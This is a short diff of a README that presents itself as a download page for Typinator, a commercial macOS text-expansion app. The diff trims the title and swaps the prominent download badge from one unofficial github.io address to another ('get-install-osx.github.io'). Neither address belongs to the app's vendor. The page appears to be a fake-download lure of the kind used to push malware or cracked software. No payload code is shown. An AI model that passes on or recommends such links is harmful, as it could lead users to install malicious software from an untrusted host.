@@ -1,4 +1,4 @@
-# Typinator for Mac – Text Expansion & Productivity Tool for macOS  
+# Typinator for Mac – Text Expansion & Productivity Tool  
 
 <div align="center">  
   <img src="https://ergonis.com/logos/typinator_icon.png" alt="Typinator for Mac Logo" width="200">  
@@ -7,7 +7,7 @@
 <br>
 
 <div align="center">  
-  <a href="https://osx-install.github.io/.github/typinator-macosx" target="_blank">  
+  <a href="https://get-install-osx.github.io/.github/typinator-macosx" target="_blank">  
     <img src="https://img.shields.io/badge/⬇️_GET_TYPINATOR_FOR_MAC-%F0%9F%92%BE-blue?style=for-the-badge&logo=apple&logoColor=white" alt="Download Typinator for Mac">  
   </a>  
 </div>  
